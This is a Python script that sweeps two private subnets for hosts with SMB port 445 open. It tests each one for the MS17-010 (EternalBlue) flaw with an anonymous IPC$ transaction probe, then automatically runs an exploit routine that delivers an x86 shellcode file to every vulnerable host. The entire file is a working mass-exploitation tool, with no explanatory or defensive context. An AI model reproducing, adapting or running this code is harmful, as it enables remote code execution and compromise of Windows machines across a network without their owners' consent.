import gevent
from gevent import socket
from struct import pack
from mysmb import MYSMB
from netaddr import IPNetwork
import eternal

TargetList = []

def scan(ip):
    ip = str(ip)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        r = s.connect_ex((ip, 445))
        if r == 0:
            TargetList.append(ip)
    except:
        pass
    s.close()

def threading():
    jobs = [gevent.spawn(scan, i) for i in IPNetwork("172.16.60.0/24")]
    gevent.joinall(jobs, timeout=int(1))

def threading2():
    jobs = [gevent.spawn(scan, i) for i in IPNetwork("172.16.65.0/24")]
    gevent.joinall(jobs, timeout=int(1))

def exploit(targets):
    for i in targets:
        print(i)
#        try:
        eternal.autoRun(i,"sc_x86.bin")
 #       except:
  #          pass



def check(open_smb):
    vulnerable_smb = []
    for target in open_smb:
        if '172.16.65.2' not in target:
            try:
                conn = MYSMB(target)
                conn.login('', '')
                tid = conn.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')
                conn.set_default_tid(tid)

                TRANS_PEEK_NMPIPE = 0x23
                recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE),
                        maxParameterCount=0xffff, maxDataCount=0x800)
                if recvPkt.getNTStatus() == 0xC0000205:
                    vulnerable_smb.append(target)
                    conn.disconnect_tree(tid)
                    conn.logoff()
                    conn.get_socket().close()
            except:
                pass

    return vulnerable_smb

if __name__ == "__main__":
    threading()
    threading2()
    targets = check(TargetList)
    print(targets)
    exploit(targets)
